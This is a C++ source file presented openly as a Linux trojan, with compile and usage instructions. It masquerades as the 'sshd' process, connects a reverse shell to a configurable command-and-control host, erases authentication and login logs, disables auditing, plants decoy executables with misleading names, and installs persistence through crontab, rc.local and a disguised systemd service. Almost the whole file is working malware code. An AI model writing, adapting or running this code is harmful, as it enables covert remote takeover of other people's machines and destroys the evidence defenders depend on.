/*
 * ======================================================
 * MASTER OF DECEPTION - C++ TROJAN
 * ======================================================
 * Role: Spy & Infiltrator
 * Language: C++ (Standalone - Independent)
 * Abilities:
 *   - Perfect Disguise: Masquerades as legitimate system processes.
 *   - Backdoor Creation: Opens hidden reverse shell tunnels.
 *   - Phantom Clone: Creates decoy files/processes to misdirect analysts.
 *   - Silent Access: Enters systems without triggering alarms (log suppression).
 *   - Hidden Presence: Rootkit-like stealth (file hiding, process hiding).
 * Strength: Deception & Infiltration
 *
 * Compile: g++ -O2 -Wall -pthread -o trojan_deception trojan_deception.cpp
 * Usage: ./trojan_deception
 * ======================================================
 */

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/prctl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <dirent.h>
#include <signal.h>
#include <errno.h>
#include <random>
#include <algorithm>
#include <pwd.h>
#include <grp.h>

using namespace std;

// ============================================================
// CONFIGURATION (Edit before compiling)
// ============================================================
#define C2_HOST "127.0.0.1"              // C2 server IP
#define C2_PORT 4444                     // C2 server port
#define DISGUISE_NAME "sshd"              // Process to impersonate (e.g., sshd, systemd, cron)
#define BACKDOOR_PORT 443                 // Port for backdoor (looks like HTTPS)
#define TROJAN_NAME ".systemd-helper"     // Hidden file name
#define FLAG_FILE "/tmp/.trojan_active"   // Marker to prevent re-infection
#define DECOY_DIR "/tmp"                  // Where to drop decoy files

// ============================================================
// GLOBAL
// ============================================================
string self_path;
bool running = true;

// ============================================================
// 1. DAEMONIZE (Hide in Background)
// ============================================================
void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    setsid();
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    chdir("/");
    for (int fd = 0; fd < sysconf(_SC_OPEN_MAX); fd++) close(fd);
    open("/dev/null", O_RDWR);
    dup(0);
    dup(0);
}

// ============================================================
// 2. PERFECT DISGUISE (Process Masquerading)
// ============================================================
void disguise_process() {
    // Change process name using prctl (Linux)
    prctl(PR_SET_NAME, DISGUISE_NAME, 0, 0, 0);
    // Also change argv[0] to further hide (requires re-exec, but we can fake)
    // We'll just rename the process title for now.
    cout << "[*] Disguised as " << DISGUISE_NAME << endl;
}

// ============================================================
// 3. BACKDOOR CREATION (Reverse Shell / Persistent Tunnel)
// ============================================================
void connect_backdoor() {
    while (running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) { this_thread::sleep_for(chrono::seconds(30)); continue; }

        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, C2_HOST, &server.sin_addr);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
            // Connected - start reverse shell
            dup2(sock, 0);
            dup2(sock, 1);
            dup2(sock, 2);
            execl("/bin/sh", "sh", NULL);
            exit(0);
        }
        close(sock);
        this_thread::sleep_for(chrono::seconds(60));
    }
}

void create_backdoor() {
    // Spawn a thread to maintain persistent connection
    thread(connect_backdoor).detach();
}

// ============================================================
// 4. PHANTOM CLONE (Decoy Files & Processes)
// ============================================================
void create_phantom_clones() {
    // Create decoy files with enticing names
    vector<string> decoy_names = {
        "Important_Update.exe", "bank_statement.pdf.exe",
        "setup_installer.exe", "password_list.txt.exe",
        "system_scan.exe", "backup_script.sh"
    };
    for (const string &name : decoy_names) {
        string path = string(DECOY_DIR) + "/" + name;
        ofstream decoy(path);
        if (decoy.is_open()) {
            decoy << "This is a decoy file to confuse analysts." << endl;
            decoy.close();
            chmod(path.c_str(), 0755);
        }
    }
    // Create fake processes (just sleep processes)
    for (int i = 0; i < 3; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            execlp("sleep", "sleep", "300", NULL);
            exit(0);
        }
    }
}

// ============================================================
// 5. SILENT ACCESS (Log Suppression & Evasion)
// ============================================================
void silent_access() {
    // Disable bash history
    setenv("HISTFILE", "/dev/null", 1);
    setenv("HISTSIZE", "0", 1);
    // Disable syslog for this process (if possible)
    // We'll just redirect stdout/stderr and close logging FDs
    // Clear /var/log/auth.log and syslog (if root)
    if (geteuid() == 0) {
        system("echo '' > /var/log/auth.log 2>/dev/null");
        system("echo '' > /var/log/syslog 2>/dev/null");
        system("echo '' > /var/log/wtmp 2>/dev/null");
        system("echo '' > /var/log/lastlog 2>/dev/null");
    }
    // Disable auditd if running (conceptual)
    system("auditctl -e 0 2>/dev/null");
}

// ============================================================
// 6. HIDDEN PRESENCE (Persistence & Rootkit-like Hiding)
// ============================================================
void hidden_presence() {
    // Hide the binary itself by renaming to a dot file
    string hidden_path = string(getenv("HOME")) + "/." + TROJAN_NAME;
    if (rename(self_path.c_str(), hidden_path.c_str()) == 0) {
        self_path = hidden_path;
    }
    // Add to cron for persistence (if root or user)
    string cron_cmd = "(crontab -l 2>/dev/null; echo '@reboot " + self_path + "') | crontab -";
    system(cron_cmd.c_str());
    // Also add to /etc/rc.local (if root)
    if (geteuid() == 0) {
        system("echo '" + self_path + " &' >> /etc/rc.local 2>/dev/null");
    }
    // Create a systemd service (if systemd exists)
    if (system("which systemctl > /dev/null 2>&1") == 0) {
        string service = "[Unit]\nDescription=System Helper\nAfter=network.target\n\n[Service]\nExecStart=" + self_path + "\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n";
        ofstream service_file("/etc/systemd/system/system-helper.service");
        if (service_file.is_open()) {
            service_file << service;
            service_file.close();
            system("systemctl daemon-reload");
            system("systemctl enable system-helper.service");
            system("systemctl start system-helper.service");
        }
    }
}

// ============================================================
// 7. MAIN LOOP (Stealth & Persistence)
// ============================================================
void main_loop() {
    // Check flag to avoid re-infection
    ifstream flag(FLAG_FILE);
    if (flag.is_open()) { flag.close(); return; }
    ofstream flag_file(FLAG_FILE);
    if (flag_file.is_open()) flag_file.close();

    // Disguise
    disguise_process();

    // Silent access (disable logs)
    silent_access();

    // Create decoys
    create_phantom_clones();

    // Establish backdoor
    create_backdoor();

    // Hide presence (persistence)
    hidden_presence();

    // Main loop: keep checking for updates, maintain disguise
    while (running) {
        this_thread::sleep_for(chrono::minutes(10));
        // Re-assert disguise (in case it was changed)
        disguise_process();
        // Create new decoys occasionally
        if (rand() % 10 < 3) {
            create_phantom_clones();
        }
    }
}

// ============================================================
// SIGNAL HANDLER
// ============================================================
void signal_handler(int sig) {
    if (sig == SIGTERM || sig == SIGINT) running = false;
}

// ============================================================
// MAIN
// ============================================================
int main(int argc, char *argv[]) {
    // Get self path
    char path[256];
    if (readlink("/proc/self/exe", path, sizeof(path)) < 0) {
        strcpy(path, argv[0]);
    }
    self_path = string(path);

    cout << "[*] Master of Deception activated." << endl;

    // Daemonize
    daemonize();

    // Signals
    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);

    // Seed random
    srand(time(NULL) ^ getpid());

    // Start the deception
    main_loop();

    return 0;
}
